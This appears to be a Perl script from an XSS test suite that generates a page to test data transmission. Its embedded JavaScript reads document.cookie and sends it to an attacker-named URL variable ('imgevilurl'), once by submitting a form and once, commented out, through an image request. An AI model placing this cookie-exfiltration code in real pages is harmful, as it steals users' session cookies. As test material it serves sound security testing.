#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Tests data transmission";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">

		var reportdut = "";
		
		// gets the number of arguments and add it to the reporting
		// variable "reportdut"

		var mycookie = $evil;

		var dut = mycookie;
		
//		var url = "$imgevilurl?normal=" + dut;
//		document.images[0].src = url;

		document.testform.action = "$imgevilurl?form=" + dut;
		document.testform.submit();
				
    </script>
|;

require "xss_basic_footer.pl";
